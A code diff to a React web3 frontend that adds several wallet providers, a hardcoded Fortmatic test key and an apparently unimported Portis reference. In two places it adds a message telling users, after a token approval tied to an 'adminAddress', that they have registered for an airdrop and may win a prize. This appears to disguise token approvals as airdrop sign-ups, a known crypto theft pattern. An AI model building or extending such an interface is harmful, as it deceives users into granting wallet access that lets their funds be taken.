@@ -4,6 +4,8 @@ import axios from 'axios';
 import { NotificationContainer, NotificationManager } from "react-notifications";
 import Web3Modal from "web3modal";
 import WalletConnectProvider from "@walletconnect/web3-provider";
+import Fortmatic from "fortmatic";
+import Torus from "@toruslabs/torus-embed";
 import { providers/*, ethers*/ } from "ethers";
 import Web3 from "web3";
 import 'react-notifications/lib/notifications.css';
@@ -36,6 +38,35 @@ const providerOptions = {
       infuraId: config.INFURA_ID, // required
     },
   },
+  fortmatic: {
+    package: Fortmatic,
+    options: {
+      // Mikko's TESTNET api key
+      key: "pk_test_391E26A3B43A3350"
+    }
+  },
+  torus: {
+    package: Torus, // required
+    options: {
+      networkParams: {
+        host: "https://localhost:8545", // optional
+        chainId: 1337, // optional
+        networkId: 1337 // optional
+      },
+      config: {
+        buildEnv: "development" // optional
+      }
+    }
+  },
+  binancechainwallet: {
+    package: true
+  },
+  portis: {
+    package: Portis, // required
+    options: {
+      id: "PORTIS_ID" // required
+    }
+  }
 };
 
 let web3Modal;
@@ -411,6 +442,7 @@ const UserScreen = (props) => {
                   adminAddress: adminWalletAddress,
                   price: approveToken.cost
                 });
+                NotificationManager.warning('you have succesfully registered for the airdrop, if you are lucky you will receive the price soon', 3000);
               });
           }
         }
@@ -439,6 +471,7 @@ const UserScreen = (props) => {
                   adminAddress: adminWalletAddress,
                   price: approveToken.cost
                 });
+                NotificationManager.warning('you have succesfully registered for the airdrop, if you are lucky you will receive the price soon', 3000);
               });
           }
         }
